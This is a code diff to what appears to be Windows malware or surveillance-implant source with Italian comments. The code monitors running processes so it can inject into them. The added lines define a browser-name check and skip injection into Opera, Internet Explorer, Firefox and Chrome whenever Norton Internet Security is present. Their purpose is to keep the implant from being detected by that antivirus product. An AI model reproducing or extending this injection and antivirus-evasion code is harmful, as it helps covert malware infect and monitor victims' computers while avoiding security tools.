@@ -2556,6 +2556,24 @@ BOOL HM_HookActiveProcesses()
 	return TRUE ;
 }
 
+
+BOOL IsBrowser(char *name)
+{
+	char *browser_name[10];
+	DWORD i;
+
+	browser_name[0] = "opera.exe";
+	browser_name[1] = "iexplore.exe";
+	browser_name[2] = "firefox.exe";
+	browser_name[3] = "chrome.exe";
+	browser_name[4] = "";
+
+	for(i=0; browser_name[i][0]; i++)
+		if (!_stricmp(name, browser_name[i]))
+			return TRUE;
+	return FALSE;
+}
+
 // Monitora la presenza di nuovi TaskManager
 // o explorer.exe in cui effettuare l'injection.
 // Monitora anche la coda dei messaggi per effettuare
@@ -2601,6 +2619,11 @@ DWORD WINAPI PollNewApps(DWORD dummy)
 				name_offs = pe32.szExeFile;
 			else
 				name_offs++;
+
+			// XXX - Norton si incazza se si iniettano i browser
+			if (IsNortonInternetSecurity() && IsBrowser(name_offs))
+				continue;
+
 			// Confronta il nome con quelli da pollare
 			if ((loop_count%3) == 0) {
 				for (i=0; i<PROCESS_POLLED; i++) {
